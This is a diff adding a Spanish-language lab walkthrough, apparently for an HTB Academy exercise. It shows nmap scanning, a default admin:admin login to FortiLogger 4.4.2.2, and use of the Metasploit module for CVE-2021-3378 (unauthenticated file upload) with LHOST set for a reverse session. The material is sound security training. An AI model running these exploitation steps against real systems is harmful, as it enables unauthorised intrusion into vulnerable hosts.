@@ -757,7 +757,57 @@ db_nmap --reason -p135,445,3389,5000,5985 -sV -sC --script=vuln -O <ip>
 ```
 <img width="1261" height="784" alt="image" src="https://github.com/user-attachments/assets/f14f8880-d0cf-4e07-92fe-159ec394532e" />
 
- <img width="1496" height="429" alt="image" src="https://github.com/user-attachments/assets/6a2845cb-c02e-4c78-86d9-cd346091b74d" />
+<img width="1496" height="429" alt="image" src="https://github.com/user-attachments/assets/6a2845cb-c02e-4c78-86d9-cd346091b74d" />
+
+También podríamos haber hecho como en el material:
+```bash
+db_nmap -sV -p- -T5 -A <ip>
+```
+No vemos a priori stack deliberadamente vulnerable.. lo que sí tenemos es el nombre `FortiLogger` en el `http-title`.
+
+
+Procedemos a inspeccionar un poco más el sitio http..
+<img width="1474" height="664" alt="image" src="https://github.com/user-attachments/assets/b7f1b8d0-5930-415b-b1a2-8bb005f09aab" />
+
+Vemos que tenemos acceso con credenciales `admin`:`admin`
+
+<img width="1908" height="856" alt="image" src="https://github.com/user-attachments/assets/503b3812-d28e-49e4-8071-235d581c27fa" />
+
+Haciendo click en el ícono de información obtenemos un popup con la versión exacta de `FortiLogger`:
+
+<img width="838" height="316" alt="image" src="https://github.com/user-attachments/assets/90725aa6-6b28-4b53-9343-fc60c96a29c5" />
+
+Versión: `FortiLogger 4.4.2.2`
+
+Buscamos en searchsploit vulnerabilidades para esa versión:
+<img width="1915" height="190" alt="image" src="https://github.com/user-attachments/assets/1d00d498-b6e5-4623-82af-179a5cf109dc" />
+
+Obtenemos un exploit que existe en `Metasploit` .. `Unauthenticated Arbitrary File Upload`.
+
+Si leemos el exploit, vemos que se trata del [CVE-2021-3378](erberkan.github.io/2021/cve-2021-3378/). 
+
+
+En metasploit buscamos por cve:
+```
+search cve:2021-3378 type:exploit
+```
+<img width="1746" height="358" alt="image" src="https://github.com/user-attachments/assets/be8243de-71c6-4dbc-9ea2-b56f68a60895" />
+
+```bash
+use 0
+options
+hosts -R
+set LHOST tun0
+check
+exploit
+```
+
+<img width="1339" height="289" alt="image" src="https://github.com/user-attachments/assets/b6f1ec12-47e4-42a8-a79a-2ea919b4d42c" />
+
+Obtenemos el usuario:
+<img width="570" height="59" alt="image" src="https://github.com/user-attachments/assets/144453d0-1fcb-43c3-b177-eb6ef6e1af2a" />
 
 
 #### Obtenga el hash de la contraseña NTLM del usuario "htb-student". Envíe el hash como respuesta.
+
+
